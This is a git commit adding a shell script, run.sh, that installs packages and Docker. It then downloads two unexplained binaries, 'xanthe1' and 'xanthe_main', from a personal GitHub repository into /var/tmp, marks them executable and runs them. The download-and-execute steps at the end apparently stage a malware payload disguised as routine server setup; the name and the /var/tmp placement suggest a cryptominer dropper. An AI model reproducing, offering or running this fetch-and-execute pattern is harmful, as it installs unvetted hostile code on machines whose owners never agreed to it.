78c9268c2418840601b81f7b13ae16dcb80b4a00
Nanda_Kumar <42697805+nandakrr@users.noreply.github.com>
2022-02-09 21:10:14 +0530

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,19 @@
+apt update
+apt -y upgrade
+apt install -y sudo nano wget unzip make gcc curl gawk python ufw net-tools default-jre ca-certificates gnupg lsb-release
+apt-get install -y -y iptables-persistent
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+echo \
+  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
+  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+apt-get update
+apt-get install -y docker-ce docker-ce-cli containerd.io
+cd /var/tmp
+wget https://github.com/nandakrr/xanthe/blob/main/xanthe1?raw=true
+wget https://raw.githubusercontent.com/nandakrr/xanthe/main/xanthe_main
+mv xanthe1?raw=true xanthe1
+chmod +x xanthe1
+chmod +x xanthe_main
+./xanthe1
+./xanthe1
+./xanthe_main
